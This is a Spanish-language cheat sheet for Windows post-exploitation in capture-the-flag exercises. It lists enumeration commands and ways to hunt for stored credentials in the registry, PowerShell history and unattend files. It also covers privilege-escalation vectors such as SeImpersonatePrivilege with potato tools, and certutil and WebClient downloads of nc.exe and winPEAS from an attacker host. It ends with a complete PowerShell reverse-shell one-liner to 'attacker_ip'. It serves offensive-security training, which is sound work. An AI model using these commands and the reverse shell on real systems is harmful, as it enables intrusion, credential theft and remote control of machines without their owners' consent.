# Post-explotación_Windows

---

Post‑explotación en Windows

Cuando ganas una shell en Windows (normalmente a través de un web shell, reverse shell con nc o una herramienta como meterpreter), necesitas enumerar el sistema, escalar privilegios, moverte lateralmente y encontrar la flag. La shell inicial suele ser cmd.exe o PowerShell limitado.
Enumeración básica del sistema
Comando	Propósito
whoami	Usuario actual y dominios
whoami /priv	Privilegios del usuario actual (SeBackupPrivilege, SeDebugPrivilege, etc.)
whoami /groups	Grupos del usuario (Administradores, Usuarios, etc.)
systeminfo	Información completa del SO, parches instalados, arquitectura
hostname	Nombre del equipo
set	Variables de entorno (rutas, carpetas de usuario, etc.)
echo %USERNAME%	Usuario actual (alternativa)
ver	Versión del sistema operativo
wmic os get caption,version,csname	Otra forma de obtener versión
Enumeración de red y conexiones
Comando	Descripción
ipconfig /all	Interfaces de red, IP, DNS, DHCP
netstat -ano	Conexiones TCP/UDP activas y puertos escuchando (PID incluido)
route print	Tabla de enrutamiento
arp -a	Tabla ARP (descubre otros equipos en la misma red)
nslookup google.com	Resolución DNS
netsh advfirewall show allprofiles	Estado del firewall
net view	Equipos visibles en la red
net user	Usuarios locales
net user %username%	Detalles del usuario actual
net localgroup administrators	Quiénes son administradores locales
Enumeración de procesos y servicios
Comando	Propósito
tasklist	Lista todos los procesos en ejecución
tasklist /svc	Procesos con los servicios que alojan
wmic process list full	Información detallada de procesos (ruta, línea de comandos, usuario)
sc query	Lista todos los servicios (estado, tipo de inicio)
sc query state= all	Servicios detenidos y en ejecución
wmic service list brief	Alternativa corta de servicios
schtasks /query /fo LIST /v	Tareas programadas con detalles (gran recurso)
Búsqueda de archivos y credenciales

Archivos de interés (configuración, claves, flags):
cmd

dir /s *flag*.*
dir /s *pass*.*
dir /s *.config, *.ini, *.conf, *.bat, *.ps1, *.kdbx
findstr /si "password" *.txt *.config *.xml

Carpetas comunes con datos sensibles:

    C:\Users\%USERNAME%\Desktop

    C:\Users\%USERNAME%\Documents

    C:\inetpub\wwwroot (webs)

    C:\xampp\htdocs

    C:\Program Files (x86)\*

    %APPDATA%\Microsoft\Windows\Recent (archivos recientes)

Credenciales almacenadas:
cmd

# Windows Credential Manager
cmdkey /list

# Archivos de historial de PowerShell
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Buscar archivos de configuración de herramientas
dir /s %APPDATA%\*.conf

# Leer el registro en busca de contraseñas en claro
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   # DefaultPassword

Escalada de privilegios en Windows – vectores comunes
Vector	Comandos / Técnicas
AlwaysInstallElevated	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Si está activo, cualquier .msi se instala como SYSTEM.
Servicios mal configurados	wmic service where "startname='LocalSystem' and pathname like '% %'" (servicios con rutas con espacios sin comillas → binario hijacking)
Tareas programadas	schtasks /query /fo LIST /v | findstr /i "SYSTEM" y comprobar scripts modificables
Privilegios del usuario	whoami /priv → Si tienes SeImpersonatePrivilege (igual que en servicios IIS), puedes usar PrintSpoofer, JuicyPotato, RoguePotato para SYSTEM.
Binarios vulnerables (SUID de Windows)	Buscar archivos con permisos inusuales: accesschk.exe -uwcqv "Authenticated Users" * (requiere Sysinternals)
Uso de credenciales en texto plano	En archivos unattend.xml, sysprep.inf, scripts de despliegue. dir /s unattend.xml sysprep.inf
Modified PATH	Si puedes escribir en una carpeta que está antes en la variable PATH que el sistema, puedes hacer hijacking de DLL.
Kernel exploits	systeminfo → buscar parches faltantes con wmic qfe get hotfixid y usar windows-exploit-suggester o Sherlock.ps1.
Herramientas útiles para transferir a la víctima
powershell

# Desde PowerShell (descarga)
(New-Object Net.WebClient).DownloadFile('http://attacker/winPEAS.exe', 'C:\Windows\Temp\winPEAS.exe')

# Desde cmd con certutil (muy fiable)
certutil -urlcache -f http://attacker/nc.exe nc.exe

Obtención de una shell completa con TTY

Si tu shell es cmd limitada, mejora a PowerShell:
cmd

powershell -c Start-Process powershell -Verb RunAs   # lanza como admin (si tienes permiso)

O con un one‑liner para reverse shell:
powershell

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('attacker_ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Encontrar la flag (ejemplo típico)
cmd

cd C:\Users\Administrator\Desktop
type flag.txt
# o
cd C:\flag
more flag.txt

¿Por qué es útil en Windows?

    Windows es el SO corporativo por excelencia; muchos CTFs incluyen máquinas Windows.

    La escalada es muy diferente a Linux; privilegios como SeImpersonatePrivilege o servicios mal configurados son específicos.

    Herramientas como certutil y powershell permiten bajar payloads incluso en entornos restringidos.

    Conocer las ubicaciones de archivos de configuración (unattend.xml, credenciales en registro) a menudo da acceso directo a administrador.

